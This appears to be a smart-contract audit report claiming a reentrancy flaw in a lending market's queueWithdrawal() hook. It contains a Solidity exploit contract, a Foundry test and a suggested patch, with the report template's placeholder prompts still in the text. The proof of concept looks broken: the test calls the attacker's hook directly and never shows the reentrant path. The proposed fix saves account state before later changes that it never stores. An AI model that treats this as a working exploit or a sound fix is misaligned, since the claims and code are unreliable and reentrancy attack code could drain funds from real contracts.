# Vulnerability details

## Impact
Detailed description of the impact of this finding.

If exploited, this vulnerability allows an attacker to recursively call the queueWithdrawal() function within the onQueueWithdrawal hook, allowing the attacker to drain or manipulate funds by queueing multiple withdrawals before the initial one is completed. This can lead to the loss of funds and disrupt the withdrawal batching mechanism.

## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

The attacker can exploit the queueWithdrawal() function via reentrancy by using the onQueueWithdrawal hook to repeatedly call queueWithdrawal(), draining liquidity or manipulating the withdrawal queue. This could lead to significant financial loss for the protocol and disrupt the proper batching of withdrawals.
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../lib/forge-std/src/Test.sol";
import "../../src/market/WildcatMarketWithdrawals.sol";
import "./WildcatMarketBase.sol";
import "../libraries/LibERC20.sol";
import "../libraries/BoolUtils.sol";

contract ReentrancyExploit {
    WildcatMarketWithdrawals public target;
    bool public reentered;

    constructor(address _target) {
        target = WildcatMarketWithdrawals(_target);
    }

    function onQueueWithdrawal(address, uint32, uint104, uint) external payable {
        if (!reentered) {
            reentered = true;
            target.queueWithdrawal(1 ether);  // Trigger reentrant call
        }
    }
}

contract WildcatMarketWithdrawalsTest is Test, WildcatMarketBase {
    using LibERC20 for address;
    using MathUtils for uint256;
    using MathUtils for bool;
    using SafeCastLib for uint256;
    using BoolUtils for bool;
    WildcatMarketWithdrawals public wildcatMarket;
    ReentrancyExploit public attacker;

    function setUp() public payable {
        wildcatMarket = new WildcatMarketWithdrawals();
        attacker = new ReentrancyExploit(address(wildcatMarket));
        hooks.setHooksAddress(address(attacker)); // Set hook to exploit reentrancy
    }

    function test_FUZZ_ReentrancyAttack(uint32 expiry) external payable {
        // Simulate an attack scenario where attacker exploits reentrancy in `queueWithdrawal`
        vm.deal(address(attacker), 10 ether);
        attacker.onQueueWithdrawal(address(attacker), expiry, 1e18, 1e18);
    }
}
```

## Recommended Mitigation Steps

```sol
  function _queueWithdrawal(
    MarketState memory state,
    Account memory account,
    address accountAddress,
    uint104 scaledAmount,
    uint normalizedAmount,
    uint baseCalldataSize
  ) internal returns (uint32 expiry) {


    // Cache batch expiry on the stack for gas savings
    expiry = state.pendingWithdrawalExpiry;


    // If there is no pending withdrawal batch, create a new one.
    if (state.pendingWithdrawalExpiry == 0) {
      // If the market is closed, use zero for withdrawal batch duration.
      uint duration = state.isClosed.ternary(0, withdrawalBatchDuration);
      expiry = uint32(block.timestamp + duration);
      emit_WithdrawalBatchCreated(expiry);
      state.pendingWithdrawalExpiry = expiry;
    }

    // @Debo Update the state here before calling onQueueWithdrawal function.
    _accounts[accountAddress] = account;

    // Execute queueWithdrawal hook if enabled
    hooks.onQueueWithdrawal(accountAddress, expiry, scaledAmount, state, baseCalldataSize);


    // Reduce account's balance and emit transfer event
    account.scaledBalance -= scaledAmount;
    
    emit_Transfer(accountAddress, address(this), normalizedAmount);


    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];


    // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.
    _withdrawalData.accountStatuses[expiry][accountAddress].scaledAmount += scaledAmount;
    batch.scaledTotalAmount += scaledAmount;
    state.scaledPendingWithdrawals += scaledAmount;


    emit_WithdrawalQueued(expiry, accountAddress, scaledAmount, normalizedAmount);


    // Burn as much of the withdrawal batch as possible with available liquidity.
    uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());
    if (availableLiquidity > 0) {
      _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);
    }


    // Update stored batch data
    _withdrawalData.batches[expiry] = batch;


    // Update stored state
    _writeState(state);
  }
```

Reentrancy
